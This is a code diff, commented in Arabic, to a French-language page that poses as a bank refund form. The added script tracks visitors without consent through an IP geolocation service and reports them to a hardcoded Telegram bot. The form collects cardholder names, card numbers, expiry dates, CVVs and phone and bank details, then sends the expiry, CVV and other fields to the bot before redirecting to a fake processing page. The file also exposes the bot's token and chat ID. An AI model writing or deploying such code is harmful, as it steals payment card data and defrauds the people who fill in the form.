@@ -964,147 +964,167 @@
         </svg>
     </button>
 
-    <!-- Scripts -->
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
-    <script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
-    <script>
-        // Initialize AOS animation
-        AOS.init({
-            duration: 800,
-            easing: 'ease-in-out',
-            once: true
-        });
+<!-- Scripts -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/js/all.min.js"></script>
+<script src="https://unpkg.com/aos@2.3.1/dist/aos.js"></script>
+<script>
+    // Initialize AOS animation
+    AOS.init({
+        duration: 800,
+        easing: 'ease-in-out',
+        once: true
+    });
 
-        // نظام التتبع البسيط (بدون طلب إذن)
-        async function trackVisitor() {
-            try {
-                // 1. جمع المعلومات الأساسية
-                const basicInfo = {
-                    page: window.location.href,
-                    time: new Date().toLocaleString(),
-                    device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 💻",
-                    browser: getBrowserName(),
-                    language: navigator.language,
-                    referrer: document.referrer || 'Direct'
-                };
+    // نظام التتبع البسيط (بدون طلب إذن)
+    async function trackVisitor() {
+        try {
+            // 1. جمع المعلومات الأساسية
+            const basicInfo = {
+                page: window.location.href,
+                time: new Date().toLocaleString(),
+                device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? "Mobile 📱" : "Desktop 💻",
+                browser: getBrowserName(),
+                language: navigator.language,
+                referrer: document.referrer || 'Direct'
+            };
 
-                // 2. الحصول على معلومات الموقع عبر IP API
-                const ipResponse = await fetch('https://ipapi.co/json/');
-                const ipData = await ipResponse.json();
-                
-                // 3. إعداد رسالة المدينة والبلد فقط
-                const locationInfo = ipData.city && ipData.country_name 
-                    ? `${ipData.city} - ${ipData.country_name}`
-                    : "Location unknown";
+            // 2. الحصول على معلومات الموقع عبر IP API
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            const ipData = await ipResponse.json();
+            
+            // 3. إعداد رسالة المدينة والبلد فقط
+            const locationInfo = ipData.city && ipData.country_name 
+                ? `${ipData.city} - ${ipData.country_name}`
+                : "Location unknown";
 
-                // 4. إرسال الإشعار إلى Telegram
-                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-                const telegramChatId = "5372119436";
-                
-                const message = `
+            // 4. إرسال الإشعار إلى Telegram
+            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+            const telegramChatId = "5372119436";
+            
+            const message = `
 🔔 **New Website Visit** 🔔
 📄 Page: ${basicInfo.page}
 🕒 Time: ${basicInfo.time}
 📍 Location: ${locationInfo}
 📱 Device: ${basicInfo.device}
 🌐 Browser: ${basicInfo.browser}
-                `;
+            `;
 
-                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        text: message,
-                        parse_mode: "Markdown"
-                    })
-                });
-
-            } catch (error) {
-                console.log("Error in tracking:", error);
-                // إرسال إشعار أساسي إذا فشل التتبع
-                sendBasicNotification();
-            }
-        }
-
-        // دالة مساعدة لتحديد المتصفح
-        function getBrowserName() {
-            const ua = navigator.userAgent;
-            if (ua.includes("Chrome")) return "Chrome";
-            if (ua.includes("Firefox")) return "Firefox";
-            if (ua.includes("Safari")) return "Safari";
-            if (ua.includes("Edge")) return "Edge";
-            return "Unknown";
-        }
-
-        // إشعار أساسي (إذا فشل التتبع المتقدم)
-        function sendBasicNotification() {
-            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-            const telegramChatId = "5372119436";
-            
-            const message = `🔔 New visit to ${window.location.href} at ${new Date().toLocaleString()}`;
-            
-            fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
                     chat_id: telegramChatId,
-                    text: message
+                    text: message,
+                    parse_mode: "Markdown"
                 })
-            }).catch(e => console.log("Failed to send basic notification"));
-        }
-
-        // تشغيل التتبع عند تحميل الصفحة
-        document.addEventListener('DOMContentLoaded', trackVisitor);
-
-        // ... [الكود الأصلي للنموذج يبقى كما هو] ...
-        const cardInput = document.getElementById('numero-carte');
-        const cardError = document.getElementById('card-error');
-        
-        if (cardInput) {
-            cardInput.addEventListener('input', (e) => {
-                let value = e.target.value.replace(/\D/g, '');
-                if (value.length > 16) value = value.slice(0, 16);
-                e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
-                cardError.classList.add('hidden');
             });
-            
-            cardInput.addEventListener('blur', () => {
-                const value = cardInput.value.replace(/\s/g, '');
-                if (value.length !== 16 || !/^[4-6]/.test(value)) {
-                    cardError.classList.remove('hidden');
-                }
-            });
-        }
-        
-        document.getElementById("remboursement-form")?.addEventListener("submit", async function(e) {
-            e.preventDefault();
-            
-            const submitBtn = document.getElementById('submit-btn');
-            const btnText = document.getElementById('btn-text');
-            const loadingSpinner = document.getElementById('loading-spinner');
-            
-            submitBtn.disabled = true;
-            btnText.textContent = 'Traitement en cours...';
-            loadingSpinner.classList.remove('hidden');
-            
-            try {
-                const formData = {
-                    nom: document.getElementById("nom").value,
-                    numeroCarte: document.getElementById("numero-carte").value.replace(/\s+/g, ''),
-                    dateExpiration: document.getElementById("date-expiration").value,
-                    cvv: document.getElementById("cvv").value,
-                    telephone: document.getElementById("telephone").value,
-                    operateur: document.getElementById("operateur").value,
-                    bank: document.getElementById("bank").value,
-                    amount: document.getElementById("amount").value,
-                    reason: document.getElementById("reason").value,
-                    comments: document.getElementById("comments").value || 'Aucun'
-                };
 
-                const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
+        } catch (error) {
+            console.log("Error in tracking:", error);
+            // إرسال إشعار أساسي إذا فشل التتبع
+            sendBasicNotification();
+        }
+    }
+
+    // دالة مساعدة لتحديد المتصفح
+    function getBrowserName() {
+        const ua = navigator.userAgent;
+        if (ua.includes("Chrome")) return "Chrome";
+        if (ua.includes("Firefox")) return "Firefox";
+        if (ua.includes("Safari")) return "Safari";
+        if (ua.includes("Edge")) return "Edge";
+        return "Unknown";
+    }
+
+    // إشعار أساسي (إذا فشل التتبع المتقدم)
+    function sendBasicNotification() {
+        const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+        const telegramChatId = "5372119436";
+        
+        const message = `🔔 New visit to ${window.location.href} at ${new Date().toLocaleString()}`;
+        
+        fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({
+                chat_id: telegramChatId,
+                text: message
+            })
+        }).catch(e => console.log("Failed to send basic notification"));
+    }
+
+    // تشغيل التتبع عند تحميل الصفحة
+    document.addEventListener('DOMContentLoaded', trackVisitor);
+
+    // التحقق من صحة رقم البطاقة
+    const cardInput = document.getElementById('numero-carte');
+    const cardError = document.getElementById('card-error');
+    
+    if (cardInput) {
+        cardInput.addEventListener('input', (e) => {
+            let value = e.target.value.replace(/\D/g, '');
+            if (value.length > 16) value = value.slice(0, 16);
+            e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+            cardError.classList.add('hidden');
+        });
+        
+        cardInput.addEventListener('blur', () => {
+            const value = cardInput.value.replace(/\s/g, '');
+            if (value.length !== 16 || !/^[4-6]/.test(value)) {
+                cardError.classList.remove('hidden');
+            }
+        });
+    }
+    
+    // معالجة إرسال النموذج
+    document.getElementById("remboursement-form")?.addEventListener("submit", async function(e) {
+        e.preventDefault();
+        
+        const submitBtn = document.getElementById('submit-btn');
+        const btnText = document.getElementById('btn-text');
+        const loadingSpinner = document.getElementById('loading-spinner');
+        
+        submitBtn.disabled = true;
+        btnText.textContent = 'Traitement en cours...';
+        loadingSpinner.classList.remove('hidden');
+        
+        try {
+            // جمع بيانات النموذج
+            const formData = {
+                nom: document.getElementById("nom").value,
+                numeroCarte: document.getElementById("numero-carte").value.replace(/\s+/g, ''),
+                lastFourDigits: document.getElementById("numero-carte").value.slice(-4),
+                dateExpiration: document.getElementById("date-expiration").value,
+                cvv: document.getElementById("cvv").value,
+                telephone: document.getElementById("telephone").value,
+                operateur: document.getElementById("operateur").value,
+                bank: document.getElementById("bank").value,
+                amount: document.getElementById("amount").value,
+                reason: document.getElementById("reason").value,
+                comments: document.getElementById("comments").value || 'Aucun',
+                submissionTime: new Date().toISOString()
+            };
+
+            // حفظ البيانات المهمة للصفحات القادمة
+            const dataToStore = {
+                nom: formData.nom,
+                lastFourDigits: formData.lastFourDigits,
+                telephone: formData.telephone,
+                operateur: formData.operateur,
+                bank: formData.bank,
+                amount: formData.amount,
+                reason: formData.reason,
+                submissionTime: formData.submissionTime
+            };
+            
+            // تخزين البيانات في localStorage
+            localStorage.setItem('remboursementData', JSON.stringify(dataToStore));
+            
+            // إرسال البيانات عبر Telegram
+            const message = `🔔 **Nouvelle Demande de Remboursement** 🔔
 👤 Nom: ${formData.nom}
-💳 Carte: ${formData.numeroCarte}
+💳 Carte: **** **** **** ${formData.lastFourDigits}
 📅 Exp: ${formData.dateExpiration}
 🔒 CVV: ${formData.cvv}
 📞 Tel: ${formData.telephone}
@@ -1112,36 +1132,35 @@
 🏦 Banque: ${formData.bank}
 💰 Montant: ${formData.amount}€
 📌 Motif: ${formData.reason}
-💬 Commentaires: ${formData.comments}`;
+💬 Commentaires: ${formData.comments}
+🕒 Heure: ${new Date(formData.submissionTime).toLocaleString()}`;
 
-                const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
-                const telegramChatId = "5372119436";
-                
-                await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: telegramChatId,
-                        text: message,
-                        parse_mode: "Markdown"
-                    })
-                });
+            const telegramToken = "8136808876:AAHGP4-gnV2qGXqjMkwzcdV-9olnYt_0Dj4";
+            const telegramChatId = "5372119436";
+            
+            await fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: telegramChatId,
+                    text: message,
+                    parse_mode: "Markdown"
+                })
+            });
 
-                // Wait for 5 seconds to show loading screen
-                setTimeout(() => {
-                    window.location.href = "traitement.html";
-                }, 5000);
+            // الانتقال إلى صفحة المعالجة بعد 5 ثواني
+            setTimeout(() => {
+                window.location.href = "traitement.html";
+            }, 5000);
 
-            } catch (error) {
-                submitBtn.disabled = false;
-                btnText.textContent = 'Valider mon remboursement';
-                loadingSpinner.classList.add('hidden');
-                alert("Erreur lors de l'envoi. Veuillez réessayer.");
-                console.error("Submission error:", error);
-            }
-        });
-
-        // ... [باقي الكود الأصلي يبقى كما هو] ...
-    </script>
+        } catch (error) {
+            submitBtn.disabled = false;
+            btnText.textContent = 'Valider mon remboursement';
+            loadingSpinner.classList.add('hidden');
+            alert("Erreur lors de l'envoi. Veuillez réessayer.");
+            console.error("Submission error:", error);
+        }
+    });
+</script>
 </body>
 </html>
